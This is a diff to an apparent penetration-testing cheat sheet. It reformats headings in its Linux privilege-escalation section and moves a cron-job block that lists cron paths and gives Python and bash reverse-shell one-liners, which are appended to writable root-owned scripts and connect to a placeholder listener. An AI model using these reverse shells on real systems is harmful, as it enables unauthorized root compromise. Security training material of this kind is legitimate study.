@@ -545,7 +545,7 @@ If somehow you need to use a **DSS** private key instead of a **RSA** private ke
 
 ## Privilege Escalation | Linux
 
-SUDO & SUID tricks: 
+**SUDO & SUID tricks:**
 
 If possible always check sudo rights first:
 
@@ -645,7 +645,7 @@ Don't forget to take a look on SUID bit set ``nmap`` binary:
 ```
 ##
 
-Bash tricks:
+**Bash tricks:**
 
 Find files containing specific string:
 
@@ -748,7 +748,49 @@ Check exploits for running services:
 # ps aux | grep root
 ```
 
-Restricted shell escape techniques:
+Always check MySQL version *(if applicable)* for **RAPTOR** exploit:
+
+```
+# mysql -V
+```
+
+##
+
+**Cronjob tricks:**
+
+Always check CRONJOBS:
+
+```
+# /etc/cron*
+# /etc/init.d
+# /etc/crontab                <- System wide cron job
+# /etc/cron.allow
+# /etc/cron.d
+# /etc/cron.daily
+# /etc/cron.hourly
+# /etc/cron.monthly
+# /etc/cron.weekly
+# /var/spool/cron             <- User crontabs
+# /var/spool/cron/crontabs    <- User crontabs
+```
+
+If there's a writable root-owned script, ``.py``, ``.sh``, etc:
+
+Python one-liner reverse shell:
+
+```
+# echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> <FILE>.py
+```
+
+Bash one-liner reverse shell:
+
+```
+# echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f" >> <FILE>.sh
+```
+
+##
+
+**Restricted shell escape techniques:**
 
 First, get your restricted shell type by hitting: ``$SHELL`` or ``$0``
 
@@ -807,50 +849,6 @@ Check out #2: https://d00mfist.gitbooks.io/ctf/content/escaping_restricted_shell
 Check out #3: https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
 
 ##
-
-Cronjob tricks:
-
-Always check CRONJOBS:
-
-```
-# /etc/cron*
-# /etc/init.d
-# /etc/crontab                <- System wide cron job
-# /etc/cron.allow
-# /etc/cron.d
-# /etc/cron.daily
-# /etc/cron.hourly
-# /etc/cron.monthly
-# /etc/cron.weekly
-# /var/spool/cron             <- User crontabs
-# /var/spool/cron/crontabs    <- User crontabs
-```
-
-If there's a writable root-owned script, ``.py``, ``.sh``, etc:
-
-Python one-liner reverse shell:
-
-```
-# echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> <FILE>.py
-```
-
-Bash one-liner reverse shell:
-
-```
-# echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f" >> <FILE>.sh
-```
-
-##
-
-Always check MySQL version *(if applicable)* for **RAPTOR** exploit:
-
-```
-# mysql -V
-```
-
-
-
-
 
 -------------------------------------------------------------
 
